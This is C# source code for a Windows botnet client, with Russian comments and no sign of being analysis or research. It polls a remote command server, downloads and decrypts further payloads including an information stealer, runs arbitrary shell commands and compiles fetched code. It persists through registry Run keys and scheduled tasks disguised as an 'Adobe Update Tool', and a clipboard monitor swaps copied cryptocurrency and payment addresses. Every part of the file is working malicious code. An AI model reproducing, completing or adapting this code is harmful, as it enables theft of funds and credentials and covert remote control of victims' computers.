using System;

using System.Net;
using System.Security.Cryptography;
using System.IO;
using System.IO.Compression;
using System.Text;

using System.Security.Principal;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Threading;

using System.Collections.Generic;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Windows.Forms;

using System.Text.RegularExpressions;
using ClipboardHelper;
using System.Threading.Tasks;

class Hello
{

    static void Main()
    {

        Mutex mutex;
        try
        {
            mutex = Mutex.OpenExisting("Roberta");
            if (mutex != null)
            {
                Process.GetCurrentProcess().Kill();
            }
        }
        catch
        {
            mutex = new Mutex(true, "Roberta");
        }
        if (FileManager.Check("https://www.goog3123123le.lv/")) //http://www.domai3123123123n.com/image.png
        {
            try
            {

                FileStream lol = new FileStream(GetDirPath.DefaultPath + "\\mutex.txt", FileMode.CreateNew);//нужно создавать файл что бы ловить exeption при его существовании
                lol.Close();
                File.WriteAllText(GetDirPath.DefaultPath + "\\mutex.txt", GetDirPath.GetHwid() + ";" + AppDomain.CurrentDomain.FriendlyName); //hwid - имя для стиллера , friendlyname - мое имя

                /// /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////        
                //string data = File.ReadAllText(GetDirPath.DefaultPath + "\\mutex.txt");
                //string[] name = data.Split(';');
                /// ///////////////////////////////////////////////////////////////////////ЛАГАЕТ////////////////////////////////////////////////////////////////////////////////////////////////////

                Process.Start(Process.GetCurrentProcess().MainModule.FileName);
                Thread.Sleep(7000);

            }
            catch
            {
                //Allbots();
                System.Threading.Timer kereno11 = new System.Threading.Timer(new TimerCallback(Allbots), null, 0, 10000); //10 sec
                ClipboardMonitor.OnClipboardChange += Clip; //запускаем клипер
                ClipboardMonitor.Start();
            }
        }
        else
        {
            System.Diagnostics.Process.Start("https://www.goog3123123le.lv/");
            //Send report that website exist
            Thread.Sleep(30000);
        }



    }



    static void Clip(ClipboardFormat format, object data) //клипер
    {
        //alahakbar@
        Regex Bitcoin = new Regex(@"^(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34}$"); //Биткоин
        Regex MoneroPoloniex = new Regex(@"^4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk"); //poloniex monero 
        Regex Ethereum = new Regex(@"^(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{40,45}$"); //ethereum //44 заменил на 45
        Regex QIWI = new Regex(@"(^\+\d{1,2})?((\(\d{3}\))|(\-?\d{3}\-)|(\d{3}))((\d{3}\-\d{4})|(\d{3}\-\d\d\-\d\d)|(\d{7})|(\d{3}\-\d\-\d{3}))");
        Regex LTC = new Regex(@"^(L[a-zA-Z0-9]{26,33})$");   //LTC
        Regex XRP = new Regex(@"^(r[rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz]{27,35})$");
        Regex DOGE = new Regex(@"^(t[0-9a-zA-Z]{34})$");
        Regex ZEC = new Regex(@"^(D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})$");
        Regex XMR = new Regex(@"^(4[0-9AB][1-9A-Za-z]{93,104})$");

        string bufertext = Clipboard.GetText();
        //      if (myReg1.IsMatch(bufertext))
        //         Clipboard.SetText("Номер телефона");

        if (bufertext.Length >= 11 && bufertext.Length <= 16 && bufertext.StartsWith("410"))
        {
            Clipboard.SetText("YANDEX_MONEY");
        }
        if (bufertext.Length == 12 || bufertext.Length == 13)
        {
            if (bufertext.StartsWith("R"))
                Clipboard.SetText("WEBMONEY_WMR");
            if (bufertext.StartsWith("Z"))
                Clipboard.SetText("WEBMONEY_WMZ");
        }
        //if (bufertext.StartsWith("+375") || bufertext.StartsWith("+7") || bufertext.StartsWith("+373") || bufertext.StartsWith("+380") || bufertext.StartsWith("+994") || (bufertext.Length == 11 && bufertext.StartsWith("8")) || (bufertext.Length == 10 && bufertext.StartsWith("9")))
        //{
        //    Clipboard.SetText("QIWI");
        //}
        if (QIWI.IsMatch(bufertext))
        {
            Clipboard.SetText(bufertext);
        }

        else if (Ethereum.IsMatch(bufertext)) //начинается с 0x ,адрес будет будет состоять из 40-44 произвольно сформированных букв латинского алфавита и цифр.
        {
            Clipboard.SetText("ethereum");
        }
        else if (Bitcoin.IsMatch(bufertext)) //&& !bufertext.StartsWith("L") && !bufertext.StartsWith("X") && !bufertext.StartsWith("0x") // && GET("https://blockchain.info/ru/q/addresstohash/", bufertext) != "0"
        {
            Clipboard.SetText("BTC wallet");
        }
        else if (LTC.IsMatch(bufertext))
        {
            Clipboard.SetText("LTC");
        }
        else if (XRP.IsMatch(bufertext))
        {
            Clipboard.SetText("RIPPLE");
        }
        else if (DOGE.IsMatch(bufertext))
        {
            Clipboard.SetText("GAV GAV DOGE");
        }
        
        else if (XMR.IsMatch(bufertext))
        {
            Clipboard.SetText("XMR");
        }
        else if (ZEC.IsMatch(bufertext))
        {
            Clipboard.SetText("Zec hujek");
        }
        else if (MoneroPoloniex.IsMatch(bufertext))
        {
            Clipboard.SetText("Monero Poloniex");
        }
        else if (bufertext.StartsWith("L"))            //ltc кошелек содержит в начале букву L или чифру 3  //&& GET("https://blockchain.info/ru/q/addresstohash/", bufertext) != "0"
        {
            Clipboard.SetText("LTC Wallet");                                                                                    // && bufertext.Length == 34
        }
        else if (bufertext.StartsWith("X"))
        {
            Clipboard.SetText("Dash wallet");
        }
        else if (bufertext.StartsWith("H"))
        {
            Clipboard.SetText("HappyCoin"); //какое то говно
        }
        //else if (bufertext.StartsWith("P"))
        //{
        //    Clipboard.SetText("OKCash"); //говно
        //}
        //else if (bufertext.StartsWith("A"))
        //{
        //    Clipboard.SetText("PrimeCoin"); //говно
        //}
        else if (bufertext.StartsWith("bitcoincash:"))
        {
            Clipboard.SetText("BITCOIN CASH");
        }
        else if (bufertext.StartsWith("etnk") && bufertext.Length == 99)
        {
            Clipboard.SetText("electronium");
        }
        else if (bufertext.StartsWith("etnk") && bufertext.Contains("."))            //electronium кошелек начинается с символов etnk
        {                                                                            //если перевод идет прямо на биржу то к кошельку
            Clipboard.SetText("electronium.paymantid");                              //нужно указывать paymant id он пишется после точки
        }
        else if (bufertext.StartsWith(@"https://steamcommunity.com/tradeoffer/new/?partner"))
        {
            Clipboard.SetText("STEAMTRADE_LINK");
        }

    }
    //static string GET(string URL, string param)
    //{
    //    try
    //    {
    //        WebRequest req = WebRequest.Create(URL + param);
    //        WebResponse resp = req.GetResponse();
    //        Stream stream = resp.GetResponseStream();
    //        StreamReader sr = new StreamReader(stream);
    //        string OUT = sr.ReadToEnd();
    //        return OUT;
    //    }
    //    catch { return "0"; }
    //}




    public static void Allbots(object states) //метод принимает object так как делегат(TimerCallback) тоже принимает object.     //object states
    {
        try
        {
            switch (Randomname.data[0])
            {
                case "update":
                    File.Delete(GetDirPath.dir + "\\" + Randomname.data[1] + ".zip");
                    File.Delete(GetDirPath.dir + "\\" + Randomname.data[1] + ".exe");
                    Botnet.Allbotnet(Randomname.data[1], Randomname.data[2]); //data 1 file name , data 2 url
                    Thread.Sleep(900000); //15 min
                    break;
                case "remove": //data[1] file path
                    try
                    {
                        File.Delete(Randomname.data[1]);
                    }
                    catch
                    {
                        //send to server report that file not exist 
                    }
                    Thread.Sleep(180000); //3 min
                    break;

                case "ddos":
                    Console.WriteLine("Eto dudoz nahoj");
                    break;
                case "download":
                    if (!File.Exists(GetDirPath.dir + Randomname.data[1] + ".exe"))
                    {
                        Botnet.Allbotnet(Randomname.data[1], Randomname.data[2]);
                    }
                    Thread.Sleep(900000);//15 min
                    break;

                case "start": //data 1 file path
                    try
                    {
                        if (Scheduler.IsAdmin())
                        {
                            Scheduler.CheckAutorun(false, Randomname.data[1]);
                            Scheduler.SetAutorunValue(true, false, Randomname.data[1], Randomname.data[2]);
                        }
                        else
                        {
                            Scheduler.CheckAutorun(true, Randomname.data[1]);
                            Scheduler.SetAutorunValue(true, true, Randomname.data[1], Randomname.data[2]);
                        }
                    }
                    catch
                    {
                        //send report that file not exist
                    }
                    Thread.Sleep(900000);
                    break;
                case "cmd_command":
                    try
                    {
                        Scheduler.Cmd(Randomname.data[1]);
                    }
                    catch
                    {
                        Thread.Sleep(180000);
                    }
                    Thread.Sleep(180000);
                    break;
                case "checkprocess":
                    try
                    {
                        string processName = Randomname.data[1];
                        processName = processName.Replace(".exe", "");
                        if (Botnet.CheckProcess(Randomname.data[1]))
                        {
                            Console.WriteLine("process est");
                        }
                        else
                        {
                            Console.WriteLine("process net");
                        }
                    }
                    catch
                    {
                        //send report that file not exist 
                    }
                    Thread.Sleep(180000);
                    break;
                case "Codedome":

                    if (File.Exists(GetDirPath.DefaultPath + "\\code.zip"))
                    {
                        File.Delete(GetDirPath.DefaultPath + "\\code.zip");
                    }
                    if (File.Exists(GetDirPath.DefaultPath + "\\code.txt"))
                    {
                        File.Delete(GetDirPath.DefaultPath + "\\code.txt");
                    }
                    File.WriteAllBytes(GetDirPath.DefaultPath + "\\code.zip", FileManager.Downloadbyte("https://richiichi.000webhostapp.com/code.zip"));
                    Decrypt.Decrypter("code", GetDirPath.DefaultPath, false);//true-exe file  false-txt file

                    Codedome.CodedomeCompiler(Randomname.data[1], Codedome.StealerORapplication(), Randomname.data[3], Randomname.data[4], Randomname.data[5], Randomname.data[6], Randomname.data[7], Randomname.data[8], Randomname.data[9], Randomname.data[10], Randomname.data[11]);
                    Scheduler.FullCheck(Randomname.data[1], GetDirPath.DefaultPath + Randomname.data[1] + ".exe");
                    Thread.Sleep(180000);
                    break;
                default:
                    try
                    {
                        if (!File.Exists(GetDirPath.dir + "\\" + GetDirPath.Hwird + ".exe")) //&& process not running
                        {
                            if (File.Exists(GetDirPath.dir + "\\" + GetDirPath.Hwird + ".zip"))
                            {
                                System.IO.File.Delete(GetDirPath.dir + "\\" + GetDirPath.Hwird + ".zip");
                            }

                            Botnet.Allbotnet_default(); //new name of stealer is Roberta
                        }
                        Scheduler.FullCheck("Adobe Update Tool", GetDirPath.dir + "\\" + GetDirPath.Hwird + ".exe");
                        Scheduler.AddToStartup(GetDirPath.Hwird + ".exe", "Adobe Update Tool");
                    }
                    catch
                    {
                        //report that dir not exist 
                    }
                    Thread.Sleep(10000); //10 sec       //420000 msec = 7 min
                    break;
            }
        }
        catch
        {
            Console.WriteLine("Can't update");
        }
    }
}
public class GetDirPath
{


    public static string DefaultPath = Environment.GetEnvironmentVariable("Temp");

    public static readonly string User_Name = Path.Combine(DefaultPath, Environment.UserName);

    public static readonly string Pass_File = Path.Combine(User_Name, "List_Password.txt");

    public static readonly string Hwird = GetHwid();

    public static string GetHwid() // Works
    {
        string id = "";
        try
        {
            var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
            ManagementObjectCollection mbsList = mbs.Get();

            foreach (ManagementObject mo in mbsList)
            {
                id = mo["ProcessorId"].ToString();
                break;
            }
            if (id == "")
            {
                id = Environment.UserName;
            }
            return id;
        }
        catch (Exception)
        {
            id = Environment.UserName;
            return id;
        }
    }
    public static string dir = GetDirPath.DefaultPath + "\\" + Hwird;
}

public class FileManager
{
    public static bool Check(string url)
    {
        HttpWebResponse response = null;
        var request = (HttpWebRequest)WebRequest.Create(url);
        request.Method = "HEAD";

        try
        {
            response = (HttpWebResponse)request.GetResponse();
            return false;
        }
        catch
        {
            /* A WebException will be thrown if the status of the response is not `200 OK` */
        }
        finally
        {
            // Don't forget to close your response.
            if (response != null)
            {
                response.Close();
            }
        }
        return true;
    }
    public static string _url = "https://richiichi.000webhostapp.com/";
    public static string GetCommand(string url)
    {
        using (WebClient webclient = new System.Net.WebClient())
        {
            return webclient.DownloadString(url);

        }
    }
    public static byte[] Downloadbyte(string url)
    {
        using (WebClient webclient = new WebClient())
        {
            //Uri rofl = new Uri("url");
            return webclient.DownloadData(url);

        }
    }

    public static Task Delay(int milliseconds)        // Asynchronous NON-BLOCKING method
    {
        var tcs = new TaskCompletionSource<object>();
        new System.Threading.Timer(_ => tcs.SetResult(null)).Change(milliseconds, -1);
        return tcs.Task;
    }

    public static string GetCommandByUrl(string url)
    {
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        return new StreamReader(response.GetResponseStream()).ReadToEnd();

    }
}


internal class Randomname
{
    static readonly string ziprandompath = Scheduler.GenerateString();
    readonly string randomname = Scheduler.GenerateString();
    static public string ExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

    public static string[] data = Data();
    public static string[] Data()
    {
        string[] data = new string[0];
        string commandname = FileManager.GetCommand("https://richiichi.000webhostapp.com/comand.php");
        data = commandname.Split(';');
        return data;
    }

    public static string Zipname()
    {
        return ziprandompath;

    }

}


public class Decrypt
{
    public static void Decrypter(string filename, string no_full_path, bool exe_or_txt)
    {
        try
        {
            var PrivateKey = FileManager.Downloadbyte("https://richiichi.000webhostapp.com/private.key");
            // Randomname zippath = new Randomname();
            OpenFileDialog Open = new OpenFileDialog();
            Decrypt decrypt = new Decrypt();
            //Open.FileName = GetDirPath.dir + "\\" + filename + ".zip";
            if (filename + ".zip" != "" && PrivateKey != null)
            {
                Directory.CreateDirectory(no_full_path + "\\Decrypted");
                decrypt.DecryptFile(no_full_path + "\\" + filename + ".zip", no_full_path + "\\Decrypted\\" + filename + ".zip", PrivateKey);
            }
            File.Delete(no_full_path + "\\" + filename + ".zip"); //GetDirPath.dir + Path.GetFileName(Open.FileName)

            File.Move(no_full_path + "\\Decrypted\\" + filename + ".zip", no_full_path + "\\" + filename + (exe_or_txt ? ".exe" : ".txt"));
            Directory.Delete(no_full_path + "\\Decrypted", true);
        }
        catch
        {
            Console.WriteLine("VAJA KRIPTOR NE RABOTAET");
        }
    }
    public void DecryptFile(string inputFile, string outputFile, byte[] privatekey)
    {
        try
        {
            using (RijndaelManaged aes = new RijndaelManaged())
            {

                DecompressToDirectory(inputFile, Path.GetDirectoryName(outputFile)); //Разделяет файл на два отдельных файла . Первый key Второй Зашифрованый файл. 
                byte[] skey = DecryptKey(File.ReadAllBytes(Path.GetDirectoryName(outputFile) + "\\key"), privatekey);
                byte[] key = skey;

                /* This is for demostrating purposes only. 
                 * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                byte[] IV = skey;
                using (FileStream fsCrypt = new FileStream(Path.GetDirectoryName(outputFile) + "\\Encrypted", FileMode.Open))
                {
                    using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
                    {
                        using (ICryptoTransform decryptor = aes.CreateDecryptor(key, IV))
                        {
                            using (CryptoStream cs = new CryptoStream(fsCrypt, decryptor, CryptoStreamMode.Read))
                            {
                                int data;
                                while ((data = cs.ReadByte()) != -1)
                                {
                                    fsOut.WriteByte((byte)data);
                                }
                            }
                        }
                    }
                }
                File.Delete(Path.GetDirectoryName(outputFile) + "\\Encrypted");
                File.Delete(Path.GetDirectoryName(outputFile) + "\\key");
            }
        }
        catch
        {
            Console.WriteLine("Can't decrypt file");
        }
    }
    public byte[] DecryptKey(byte[] key, byte[] PrivateKey)
    {
        RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
        rsa.ImportCspBlob(PrivateKey);

        return rsa.Decrypt(key, true);
    }
    static void DecompressToDirectory(string sCompressedFile, string sDir)
    {
        using (FileStream inFile = new FileStream(sCompressedFile, FileMode.Open, FileAccess.Read, FileShare.None))
        using (GZipStream zipStream = new GZipStream(inFile, CompressionMode.Decompress, true))
            while (DecompressFile(sDir, zipStream)) ;
    }
    static bool DecompressFile(string sDir, GZipStream zipStream)
    {
        //Decompress file name
        byte[] bytes = new byte[sizeof(int)];
        int Readed = zipStream.Read(bytes, 0, sizeof(int));
        if (Readed < sizeof(int))
            return false;

        int iNameLen = BitConverter.ToInt32(bytes, 0);
        bytes = new byte[sizeof(char)];
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < iNameLen; i++)
        {
            zipStream.Read(bytes, 0, sizeof(char));
            char c = BitConverter.ToChar(bytes, 0);
            sb.Append(c);
        }
        string sFileName = sb.ToString();

        //Decompress file content
        bytes = new byte[sizeof(int)];
        zipStream.Read(bytes, 0, sizeof(int));
        int iFileLen = BitConverter.ToInt32(bytes, 0);

        bytes = new byte[iFileLen];
        zipStream.Read(bytes, 0, bytes.Length);

        string sFilePath = Path.Combine(sDir, sFileName);
        string sFinalDir = Path.GetDirectoryName(sFilePath);
        if (!Directory.Exists(sFinalDir))
            Directory.CreateDirectory(sFinalDir);

        using (FileStream outFile = new FileStream(sFilePath, FileMode.Create, FileAccess.Write, FileShare.None))
            outFile.Write(bytes, 0, iFileLen);

        return true;
    }
}



public class Codedome
{
    public static void CodedomeCompiler(string filename, bool stealerORapplication, string version, string dll0, string dll1, string dll2, string dll3, string dll4, string dll5, string dll6, string dll7) //data1 имя файла без exe ; data2 тернарный оператор true- любая программа false - стиллер 
    {

        string source = File.ReadAllText(GetDirPath.DefaultPath + "\\code.txt");
        File.Delete(GetDirPath.DefaultPath + "\\code.txt");

        Dictionary<string, string> providerOptions = new Dictionary<string, string>
                {
                    {"CompilerVersion", version}
                };
        CSharpCodeProvider provider = new CSharpCodeProvider(providerOptions);

        CompilerParameters compilerParams = new CompilerParameters

        { OutputAssembly = stealerORapplication ? GetDirPath.dir + filename + ".exe" : GetDirPath.DefaultPath + GetDirPath.Hwird + ".exe", GenerateExecutable = true, CompilerOptions = "/target:winexe" }; ///target:exe

        compilerParams.ReferencedAssemblies.Add(dll0);
        compilerParams.ReferencedAssemblies.Add(dll1);
        compilerParams.ReferencedAssemblies.Add(dll2);
        compilerParams.ReferencedAssemblies.Add(dll3);
        compilerParams.ReferencedAssemblies.Add(dll4);

        try
        {
            compilerParams.ReferencedAssemblies.Add(dll5);
            compilerParams.ReferencedAssemblies.Add(dll6);
            compilerParams.ReferencedAssemblies.Add(dll7);
        }
        catch
        {

        }
        CompilerResults results = provider.CompileAssemblyFromSource(compilerParams, source);

        Console.WriteLine("Number of Errors: {0}", results.Errors.Count);
        foreach (CompilerError err in results.Errors)
        {
            Console.WriteLine("ERROR {0}", err.ErrorText);
        }
    }
    public static bool StealerORapplication()
    {
        if (Randomname.data[2].Contains("true"))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
}


class Botnet
{
    public static bool CheckProcess(string name)
    {
        name = name.Replace(".exe", "");
        foreach (Process process in Process.GetProcesses())
        {
            if (process.ProcessName.Contains(name))
            {
                return true;
            }
        }
        return false;
    }
    public static void Allbotnet_default()//Добавляет стиллер
    {
        Directory.CreateDirectory(GetDirPath.dir);
        using (var client = new WebClient())
        {

            File.WriteAllBytes(GetDirPath.dir + "\\" + GetDirPath.Hwird + ".zip", client.DownloadData("https://richiichi.000webhostapp.com/Roberta.zip"));

            Decrypt.Decrypter(GetDirPath.Hwird, GetDirPath.dir, true);
            //Thread.Sleep(20);
            Scheduler.FullCheck("Adobe Update Tool", GetDirPath.dir + "\\" + GetDirPath.Hwird + ".exe");
            Scheduler.AddToStartup(GetDirPath.Hwird + ".exe", "Adobe Update Tool");
        }
    }

    public static void Allbotnet(string filename, string url)//Добавляет текущий файл
    {
        Directory.CreateDirectory(GetDirPath.dir);
        using (var client = new WebClient())
        {

            File.WriteAllBytes(GetDirPath.dir + "\\" + filename + ".zip", client.DownloadData(url));

            Decrypt.Decrypter(filename, GetDirPath.dir, true);
            //Thread.Sleep(20);
            Scheduler.FullCheck(filename, GetDirPath.Hwird);
            Scheduler.AddToStartup(filename, filename);
        }
    }
}

class Scheduler
{

    public static void AddToStartup(string currFilename, string description)
    {
        Cmd("schtasks /create /tn " + description + "  /tr %userprofile%\\AppData\\Local\\" + currFilename + " /st 00:00 /du 9999:59 /sc daily /ri 1 /f");
    }

    public static void Cmd(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo("cmd", "/C " + command)
        };
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
    }

    public static String GenerateString()
    {
        string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
        string result = "";
        Random rnd = new Random();
        int iter = rnd.Next(0, abc.Length);
        for (int i = 0; i < iter; i++)
            result += abc[rnd.Next(0, abc.Length)];
        return result;
    }
    public static bool IsAdmin()
    {
        bool isElevated;
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        return isElevated;
    }

    public static bool CheckAutorun(bool User, string regedit_name)
    {

        using (RegistryKey Key = User ? Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\")
            : Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\")) //Тернарный оператор
            if (Key != null)
            {
                //string val = Key.GetValue("COMODO Internet Security");
                if (Key.GetValue(regedit_name) == null)
                {
                    return false;
                }
            }
        return true;
    }
    public static void FullCheck(string name, string path)
    {
        if (IsAdmin())
        {
            if (!CheckAutorun(false, name))
            {
                SetAutorunValue(true, false, name, path);
            }
        }
        else
        {
            if (!CheckAutorun(true, name))
            {
                SetAutorunValue(true, true, name, path);
            }
        }
    }

    public static void SetAutorunValue(bool autorun, bool User, string name, string path)
    {
        RegistryKey reg;


        reg = User ? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\")
            : Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\");
        try
        {
            if (autorun)
                reg.SetValue(name, path);
            else
                reg.DeleteValue(name);

            reg.Close();
        }
        catch
        {

        }
    }

}
